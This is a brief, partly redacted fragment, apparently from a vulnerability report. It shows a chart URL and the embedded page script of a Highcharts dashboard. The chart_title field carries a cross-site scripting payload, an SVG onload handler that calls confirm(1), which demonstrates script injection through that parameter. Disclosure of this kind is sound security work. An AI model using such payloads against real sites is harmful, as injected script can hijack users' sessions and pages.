<redacted>

url=/chart_data%2Fmetric_charts%2Fsingle_metric.json...<redacted>&chart_title=title
 
<script type='text/javascript'>
      jQuery(function($) {
        var loadChart = function() {
          $('#embedded-chart').highcharts({
            height: '100%',
            dataUrl: '/public/charts/jwBDr0K0WhZ/data.json',
            render: true,
            fluid: true,
            loadingOverlay: true,
            snappable: true,
            chart_title: "<Brute Data-Spy=scroll Data-Target='<Svg OnLoad=(confirm)(1)>'>",
            liveChart: false,
            dataApiUrl: '',
            zoom_url: '',
            dataApiField: '',
            addToDashboard: true,
            embeddable: true
          });
        };
        jQuery.rpm.highcharts.registerRender(loadChart);
      });
    </script>
